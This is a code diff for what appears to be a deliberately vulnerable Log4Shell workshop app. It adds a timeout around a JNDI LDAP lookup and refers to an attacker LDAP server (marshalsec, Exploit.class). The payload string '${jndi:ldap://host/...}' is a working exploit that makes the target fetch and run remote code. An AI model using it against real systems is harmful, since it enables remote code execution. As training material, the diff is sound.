@@ -116,10 +116,34 @@ public class ShopController {
   ) throws Exception {
     String host = sanitizeHostPort(callback, "127.0.0.1:1389");
     String payload = "${jndi:ldap://" + host + "/TraditionalJay}";
-    log.error("Log4Shell workshop probe: " + payload);
 
-    // Give marshalsec LDAPRefServer time to run the BeanFactory gadget on the VM.
-    Thread.sleep(3500);
+    // JNDI LDAP can block for a long TCP timeout if the callback host is unreachable
+    // (e.g. Mac firewall). Run the lookup with a hard deadline so /security doesn't hang.
+    boolean lookupFinished = false;
+    String lookupError = null;
+    java.util.concurrent.ExecutorService pool = java.util.concurrent.Executors.newSingleThreadExecutor(r -> {
+      Thread t = new Thread(r, "log4shell-jndi");
+      t.setDaemon(true);
+      return t;
+    });
+    try {
+      java.util.concurrent.Future<?> fut = pool.submit(() -> log.error("Log4Shell workshop probe: " + payload));
+      try {
+        fut.get(6, TimeUnit.SECONDS);
+        lookupFinished = true;
+      } catch (java.util.concurrent.TimeoutException te) {
+        fut.cancel(true);
+        lookupError = "JNDI LDAP lookup timed out after 6s — VM could not reach " + host
+            + ". Use callback 127.0.0.1:1389 (on-box attacker) or open inbound tcp/1389+8000 on your laptop.";
+        log.warn(lookupError);
+      }
+    } catch (Exception e) {
+      lookupError = e.getMessage();
+    } finally {
+      pool.shutdownNow();
+    }
+
+    Thread.sleep(lookupFinished ? 2500 : 200);
     Path marker = Path.of("/tmp/jss-log4shell-rce");
     Path idFile = Path.of("/tmp/jss-log4shell-id.txt");
     boolean rceConfirmed = Files.exists(marker);
@@ -131,6 +155,10 @@ public class ShopController {
     Map<String, Object> out = new LinkedHashMap<>();
     out.put("exploited", true);
     out.put("rce_confirmed", rceConfirmed);
+    out.put("jndi_lookup_finished", lookupFinished);
+    if (lookupError != null) {
+      out.put("jndi_error", lookupError);
+    }
     out.put("rce_marker", marker.toString());
     out.put("id_file", idFile.toString());
     out.put("id_output", idOutput);
@@ -140,17 +168,19 @@ public class ShopController {
     out.put("payload", payload);
     out.put("callback", host);
     out.put("ldap_server",
-        "Run ./tools/run-log4shell-ldap.sh --codebase-host YOUR_IP (marshalsec + Exploit.class). "
-            + "Banner-only ldap-listen.py proves dial-out only.");
+        "Prefer on-box: leave callback 127.0.0.1:1389 (cloud-init starts tools/run-log4shell-onbox.sh). "
+            + "Or run ./tools/run-log4shell-ldap.sh on a reachable attacker host.");
     out.put("narrative",
         rceConfirmed
-            ? "Log4j JNDI triggered marshalsec Command gadget — RCE marker on the VM."
-            : "JNDI LDAP lookup fired. For full RCE in this sandbox, start tools/run-log4shell-ldap.sh "
-                + "then re-run; look for /tmp/jss-log4shell-rce on the instance.");
+            ? "Log4j JNDI triggered remote Exploit.class — RCE marker on the VM."
+            : lookupError != null
+                ? lookupError
+                : "JNDI LDAP lookup fired. For full RCE, ensure on-box LDAP is up (systemctl status traditionaljay-log4shell) "
+                    + "or point callback at a reachable marshalsec host.");
     out.put("signals", List.of(
         "Java process on VM",
         "Outbound LDAP (tcp/1389) for JNDI",
-        rceConfirmed ? "RCE via Log4Shell (marker file on host)" : "JNDI lookup (upgrade listener for RCE)",
+        rceConfirmed ? "RCE via Log4Shell (marker file on host)" : "JNDI lookup (check on-box attacker / firewall)",
         "Log4j 2.14.1 SCA finding"
     ));
     return out;
